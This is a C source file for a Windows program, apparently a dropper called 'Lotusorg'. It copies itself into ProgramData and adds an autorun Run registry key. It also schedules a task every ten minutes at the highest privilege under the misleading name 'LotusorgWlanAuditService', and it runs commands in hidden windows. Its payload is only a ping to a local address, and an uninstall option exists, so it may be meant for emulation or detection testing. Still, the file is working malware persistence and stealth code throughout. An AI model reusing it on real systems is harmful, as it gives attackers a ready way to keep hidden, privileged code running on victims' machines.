#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define RUN_KEY_HKCU "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define RUN_VALUE_NAME "LotusorgLoader"
#define TASK_NAME "LotusorgWlanAuditService"
#define PERSISTENCE_PATH "C:\\ProgramData\\LotusorgDropper.exe"

//configurable IP for ping
char g_ping_target[64] = "192.168.1.100";

void install_persistence();
void uninstall_persistence();
int is_installed();
void launch_payload();
void schedule_task();
void delete_task();
void run_cmd(const char *cmd);

int main(int argc, char *argv[]) {
    if (argc < 2) return 1;

    if (strcmp(argv[1], "--install") == 0) {
        install_persistence();
    }
    else if (strcmp(argv[1], "--uninstall") == 0) {
        uninstall_persistence();
    }
    else if (strcmp(argv[1], "--runpayload") == 0) {
        launch_payload();
    }
    return 0;
}

void install_persistence() {
    HKEY hKey;
    LONG res;
    char self_path[MAX_PATH];
    GetModuleFileNameA(NULL, self_path, MAX_PATH);
    CopyFileA(self_path, PERSISTENCE_PATH, FALSE);

    res = RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY_HKCU, 0, KEY_SET_VALUE, &hKey);
    if (res == ERROR_SUCCESS) {
        RegSetValueExA(hKey, RUN_VALUE_NAME, 0, REG_SZ, (const BYTE*)PERSISTENCE_PATH, (DWORD)(strlen(PERSISTENCE_PATH)+1));
        RegCloseKey(hKey);
    }

    schedule_task();
}

void uninstall_persistence() {
    HKEY hKey;
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY_HKCU, 0, KEY_SET_VALUE, &hKey);
    if (res == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, RUN_VALUE_NAME);
        RegCloseKey(hKey);
    }

    delete_task();
    DeleteFileA(PERSISTENCE_PATH);
}

int is_installed() {
    HKEY hKey;
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY_HKCU, 0, KEY_QUERY_VALUE, &hKey);
    if (res != ERROR_SUCCESS) return 0;

    char val[MAX_PATH];
    DWORD val_size = sizeof(val);
    res = RegQueryValueExA(hKey, RUN_VALUE_NAME, NULL, NULL, (LPBYTE)val, &val_size);
    RegCloseKey(hKey);
    if (res != ERROR_SUCCESS) return 0;

    DWORD attr = GetFileAttributesA(val);
    if (attr == INVALID_FILE_ATTRIBUTES) return 0;

    return 1;
}

void launch_payload() {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "ping -n 1 %s > nul", g_ping_target);
    run_cmd(cmd);
}

void schedule_task() {
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "schtasks /Create /F /TN \"%s\" /TR \"%s --runpayload\" /SC MINUTE /MO 10 /RL HIGHEST",
        TASK_NAME, PERSISTENCE_PATH);
    run_cmd(cmd);
}

void delete_task() {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "schtasks /Delete /F /TN \"%s\"", TASK_NAME);
    run_cmd(cmd);
}

void run_cmd(const char *cmd) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}
